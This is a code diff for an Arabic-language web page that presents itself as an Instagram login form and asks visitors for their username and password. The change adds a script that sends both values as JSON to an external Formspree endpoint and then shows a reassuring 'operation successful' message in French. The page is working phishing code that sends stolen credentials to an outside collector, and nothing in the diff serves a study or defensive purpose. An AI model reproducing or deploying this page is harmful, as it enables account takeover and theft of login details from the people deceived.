@@ -1,8 +1,9 @@
 from instagram
+<!DOCTYPE html>
 <html lang="ar">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>إدخال معلومات إنستغرام</title>
     <style>
         body {
@@ -11,7 +12,7 @@ from instagram
             text-align: center;
             padding: 50px;
         }
-        .form-container {
+        .form-container, .thank-you-container {
             background-color: #fff;
             padding: 30px;
             border-radius: 8px;
@@ -46,18 +47,46 @@ from instagram
     </style>
 </head>
 <body>
-    <div class="form-container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/1024px-Instagram_icon.png" alt="Instagram Logo" class="logo">
+
+    <div class="form-container" id="form-section">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/1024px-Instagram_icon.png" alt="Instagram Logo" class="logo" />
         <h2>إدخال معلوماتك الخاصة بحساب إنستغرام</h2>
-        <form action="https://formspree.io/f/xeoapeqj" method="POST">
+        <form id="loginForm">
             <label for="username">اسم المستخدم</label>
-            <input type="text" id="username" name="username" placeholder="أدخل اسم المستخدم" required>
+            <input type="text" id="username" name="username" placeholder="أدخل اسم المستخدم" required />
 
             <label for="password">كلمة المرور</label>
-            <input type="password" id="password" name="password" placeholder="أدخل كلمة المرور" required>
+            <input type="password" id="password" name="password" placeholder="أدخل كلمة المرور" required />
 
             <button type="submit">إرسال</button>
         </form>
     </div>
+
+    <div class="thank-you-container" id="thank-you-section" style="display: none;">
+        <h2>Merci pour votre compréhension</h2>
+        <p>Votre opération a été effectuée avec succès.</p>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            // Simuler l'envoi des données
+            fetch("https://formspree.io/f/xeoapeqj", {
+                method: "POST",
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    username: document.getElementById('username').value,
+                    password: document.getElementById('password').value
+                })
+            }).then(response => {
+                // Cacher le formulaire et afficher le message de remerciement
+                document.getElementById('form-section').style.display = 'none';
+                document.getElementById('thank-you-section').style.display = 'block';
+            }).catch(error => {
+                alert("Une erreur s'est produite. Veuillez réessayer.");
+            });
+        });
+    </script>
 </body>
 </html>
